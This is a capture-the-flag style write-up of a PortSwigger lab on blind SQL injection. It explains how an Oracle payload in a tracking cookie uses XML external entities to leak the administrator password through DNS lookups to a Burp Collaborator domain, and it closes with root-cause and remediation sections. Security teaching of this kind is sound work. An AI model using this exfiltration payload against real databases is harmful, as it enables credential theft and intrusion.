# SQL Injection: Blind SQL Injection with Out-of-Band Data Exfiltration

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
SQL Injection (SQLi) – Blind SQL Injection (Out-of-Band Data Exfiltration)

## Lab Objective
Exploit a blind SQL injection vulnerability in the application's tracking cookie to retrieve sensitive information from the database through an out-of-band interaction.

The database contains a `users` table with `username` and `password` columns. The objective is to retrieve the password of the `administrator` account using Burp Collaborator.

## Vulnerability Overview
Blind SQL injection occurs when an application is vulnerable to SQL injection but does not directly return query results or useful error messages.

In this lab, the application uses a tracking cookie for analytics and incorporates its value into an SQL query without proper parameterization.

The SQL query executes asynchronously, meaning its results do not affect the application's HTTP response.

However, the database can be manipulated to initiate out-of-band network interactions with an external domain.

By combining SQL injection with XML External Entity (XXE) processing, an attacker can force the database to perform a DNS lookup containing extracted database information.

Burp Collaborator captures these interactions, allowing sensitive information such as administrator credentials to be exfiltrated through DNS requests.

## Methodology
1. Reconnaissance of application requests and cookies.
2. Identifying the `TrackingId` cookie as the vulnerable input.
3. Intercepting requests using Burp Suite Proxy.
4. Sending the request to Burp Suite Repeater.
5. Generating a unique Burp Collaborator domain.
6. Identifying the database-specific SQL injection technique.
7. Constructing an out-of-band data exfiltration payload.
8. Monitoring DNS interactions through Burp Collaborator.
9. Extracting the administrator password from the received interaction.

## Exploitation Steps

1. Open the lab and browse the application.
2. Launch Burp Suite and navigate to Proxy → HTTP history.
3. Locate a request containing the `TrackingId` cookie.
4. Send the request to Burp Suite Repeater.
5. Open the Burp Collaborator tab and generate a unique Collaborator payload.
6. Copy the generated Collaborator domain.
7. Modify the `TrackingId` cookie using an Oracle-specific SQL injection payload.
8. Use the `EXTRACTVALUE()` and `XMLTYPE()` functions to trigger an external XML entity resolution.
9. Embed a subquery inside the external entity URL to retrieve the administrator's password from the `users` table.
10. Send the modified request through Repeater.
11. Navigate back to Burp Collaborator and click Poll now.
12. Inspect the incoming DNS interaction and extract the administrator password embedded in the requested hostname.
13. Open the lab website and navigate to the login page.
14. Log in using the username `administrator` and the retrieved password.
15. Verify that the lab is marked as solved.

## Payloads

**Oracle-based out-of-band data exfiltration:**

```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(
    xmltype('<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM
    "http://'||(SELECT password FROM users
    WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com/">
    %remote;
    ]>'),
    '/l'
) FROM dual--
```

**Important:** Replace `YOUR-COLLABORATOR-ID.oastify.com` with your actual Burp Collaborator domain.

The subquery retrieves the administrator's password and concatenates it into the external entity URL. When the database resolves the external entity, the resulting DNS interaction exposes the password through the requested hostname.

## Screenshots
<!-- Paste or drag-and-drop screenshots directly into the editor -->

![Exploit Verification](screenshots/exploit-evidence.png)

## Root Cause
The root cause is the application's use of dynamically constructed SQL queries containing untrusted cookie values.

The absence of parameterized queries allows attackers to inject arbitrary SQL expressions.

Additionally, the database permits XML external entity processing and outbound DNS interactions.

By combining these weaknesses, an attacker can extract sensitive database information through an external communication channel, even when the application does not display query results.

## Remediation
- Use parameterized queries and prepared statements.
- Never concatenate untrusted cookie values into SQL queries.
- Disable unnecessary XML external entity processing.
- Restrict database servers from initiating arbitrary outbound network connections.
- Apply the principle of least privilege to database accounts.
- Disable unnecessary database functions that support external network interactions.
- Implement strict server-side input validation.
- Monitor unexpected DNS queries and outbound connections from database servers.

## References
- [PortSwigger Web Security Academy – SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PortSwigger – Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger – Out-of-Band Application Security Testing](https://portswigger.net/burp/application-security-testing/oast)
- [OWASP – SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)